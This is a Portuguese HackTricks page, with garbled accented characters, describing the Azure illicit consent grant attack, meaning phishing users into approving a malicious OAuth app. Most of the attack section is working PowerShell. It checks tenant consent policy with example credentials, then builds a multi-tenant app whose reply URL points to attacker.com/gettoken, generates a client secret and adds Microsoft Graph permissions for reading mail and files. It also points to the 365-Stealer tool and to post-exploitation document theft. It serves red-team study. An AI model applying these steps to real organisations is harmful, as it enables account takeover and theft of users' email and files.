# Az - Concess√£o de Consentimento Il√≠cita

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Phishing de Aplicativos OAuth

**Aplica√ß√µes Azure** pedem permiss√µes para acessar os **dados do usu√°rio** (informa√ß√µes b√°sicas, mas tamb√©m acesso a documentos, enviar e-mails...).\
Se **permitido**, um usu√°rio normal s√≥ pode conceder consentimento para permiss√µes de **"Baixo Impacto"**. Em **todos os outros** casos, **√© necess√°rio o consentimento do administrador**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada incluindo `permiss√£o para conceder permiss√µes a aplica√ß√µes` podem fornecer consentimento em todo o tenant.

Apenas permiss√µes que **n√£o requerem consentimento do administrador** s√£o classificadas como de **baixo impacto**. Estas s√£o permiss√µes necess√°rias para **login b√°sico s√£o openid, profile, email, User.Read e offline_access**. Se uma **organiza√ß√£o** **permite** consentimento do usu√°rio para **todas as aplica√ß√µes**, um funcion√°rio pode conceder consentimento a uma aplica√ß√£o para **ler o acima do seu perfil**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Portanto, um atacante poderia preparar uma **Aplica√ß√£o maliciosa** e com um **phishing**, fazer o usu√°rio **aceitar a Aplica√ß√£o e roubar seus dados**.

### Verificar se os usu√°rios t√™m permiss√£o para consentir

Verifique se os usu√°rios t√™m permiss√£o para consentir a aplica√ß√µes:

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **Desativar consentimento do usu√°rio**: Usu√°rios n√£o podem conceder permiss√µes a aplicativos.
* **Usu√°rios podem consentir com aplicativos de editores verificados ou da sua organiza√ß√£o, mas apenas para permiss√µes que voc√™ selecionar**: Todos os usu√°rios s√≥ podem consentir com aplicativos que foram publicados por um editor verificado e aplicativos que est√£o registrados no seu tenant
* **Usu√°rios podem consentir com todos os aplicativos**: permite que todos os usu√°rios consintam com qualquer permiss√£o que n√£o exija consentimento do administrador,
* **Pol√≠tica de consentimento de aplicativo personalizada**

## **O que √© Ataque de Concess√£o de Consentimento Il√≠cito?**

Em um ataque de concess√£o de consentimento il√≠cito, o atacante cria um **aplicativo registrado no Azure que solicita acesso a dados como informa√ß√µes de contato, e-mail ou documentos**. O atacante ent√£o engana um usu√°rio final para conceder consentimento ao aplicativo para que o atacante possa acessar os dados aos quais o usu√°rio-alvo tem acesso. Depois que o aplicativo recebeu consentimento, ele tem acesso ao n√≠vel da conta do usu√°rio aos dados sem a necessidade de uma conta organizacional.

Em palavras simples, quando a v√≠tima clica naquele belo bot√£o azul de "Aceitar", o Azure AD envia um token para o site de terceiros que pertence a um atacante, onde o atacante usar√° o token para realizar a√ß√µes em nome das v√≠timas, como acessar todos os Arquivos, Ler E-mails, Enviar E-mails etc.

## **Fluxo de Ataque**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para realizar este ataque contra a empresa "ecorp", o atacante poderia registrar um dom√≠nio com o nome "safedomainlogin.com" e criar um subdom√≠nio ["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/) onde eles **hospedaram o aplicativo para capturar o c√≥digo de autoriza√ß√£o** e depois solicitar os tokens de acesso.

Em seguida, registre um Aplicativo Multi-Tenant no seu Tenant do Azure AD e nomeie-o como "ecorp" e adicione a URL de Redirecionamento que aponta para o "ecorp.safedomainlogin.com", que hospeda um aplicativo para capturar o c√≥digo de autoriza√ß√£o.

O atacante tamb√©m cria um novo segredo de cliente e adiciona algumas **permiss√µes** de API, como `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` no aplicativo. Assim, uma vez que o **usu√°rio concede o consentimento ao aplicativo**, o atacante pode **extrair** as **informa√ß√µes sens√≠veis** em nome do usu√°rio.

O atacante finalmente cria o **link** que continha o ID do cliente do aplicativo malicioso e **compartilha** o link com os **usu√°rios-alvo** para obter o consentimento deles.

## 365-Stealer

Voc√™ pode realizar este ataque com [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

Como etapa extra, se voc√™ tem algum **acesso sobre um usu√°rio na organiza√ß√£o v√≠tima**, voc√™ pode verificar se a pol√≠tica permitir√° que ele **aceite aplicativos**:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
Para este ataque, voc√™ precisar√° criar um **novo App no seu Tenant do Azure** (em App registrations) com, por exemplo, as seguintes permiss√µes:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` est√° dentro de `Microsoft Graph` em `Permiss√µes delegadas`. (Permiss√µes de aplicativo sempre precisar√£o de aprova√ß√£o extra).

* `User.ReadBasic.All` √© a permiss√£o que permitir√° a voc√™ **ler informa√ß√µes de todos os usu√°rios** na organiza√ß√£o, se concedida.
* Lembre-se de que apenas `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada incluindo `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em todo o tenant. Portanto, voc√™ deve **phish um usu√°rio com um desses pap√©is** se quiser que ele aprove um **App que requer consentimento do administrador**.

Voc√™ tamb√©m pode criar um App via cli com:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Verifique [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender como configur√°-lo.

{% hint style="warning" %}
Observe que o **token de acesso** obtido ser√° para o **ponto de extremidade graph** com os escopos: `User.Read` e `User.ReadBasic.All` (as permiss√µes solicitadas). Voc√™ n√£o poder√° realizar outras a√ß√µes (mas essas s√£o suficientes para **baixar informa√ß√µes sobre todos os usu√°rios** na organiza√ß√£o).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Voc√™ tamb√©m pode usar esta ferramenta para realizar este ataque.

## P√≥s-Explora√ß√£o

Uma vez que voc√™ tenha acesso ao usu√°rio, voc√™ pode fazer coisas como roubar documentos sens√≠veis e at√© mesmo fazer upload de arquivos de documentos com backdoor.

## Refer√™ncias

* Este post foi copiado de [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
